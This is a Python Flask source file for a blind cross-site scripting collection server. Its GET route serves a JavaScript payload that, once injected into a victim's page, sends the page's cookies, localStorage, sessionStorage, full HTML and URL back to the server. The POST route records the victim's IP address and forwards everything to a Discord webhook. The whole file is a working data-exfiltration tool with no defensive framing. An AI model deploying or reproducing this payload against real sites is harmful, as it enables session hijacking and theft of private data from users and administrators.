from flask import Flask, request, jsonify, Response
from flask_cors import CORS
from datetime import datetime
import os
import json
import requests
from dotenv import load_dotenv

# Load environment variables from .env
load_dotenv()

app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK_URL")

@app.route('/', methods=['GET', 'POST'])
def bxss_logger():
    if request.method == 'GET':
        # Return JS payload when <script src="..."> is loaded
        js = f"""
(async () => {{
  try {{
    const data = {{
      url: location.href,
      origin: location.origin,
      referrer: document.referrer,
      userAgent: navigator.userAgent,
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      html: document.documentElement.outerHTML,
      timestamp: new Date().toISOString()
    }};

    await fetch("{request.host_url}", {{
      method: "POST",
      headers: {{
        "Content-Type": "application/json"
      }},
      body: JSON.stringify(data)
    }});
  }} catch (e) {{
    console.error("BXSS script error:", e);
  }}
}})();
"""
        return Response(js, mimetype="application/javascript")

    # POST request handling: store and forward the exfiltrated data
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({"error": "Invalid JSON"}), 400

    # Add IP address and server-side timestamp
    data["ip"] = request.remote_addr
    data["server_time"] = datetime.utcnow().isoformat()

   # print("[BXSS] New Log:\n", json.dumps(data, indent=2))

    # Send to Discord webhook if set
    if DISCORD_WEBHOOK:
        try:
            requests.post(DISCORD_WEBHOOK, json={
                "content": f"📦 **BXSS Payload Log**\n```json\n{json.dumps(data, indent=2)}```"
            })
        except Exception as e:
            print("[!] Failed to send to Discord:", e)

    return jsonify({"status": "ok"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
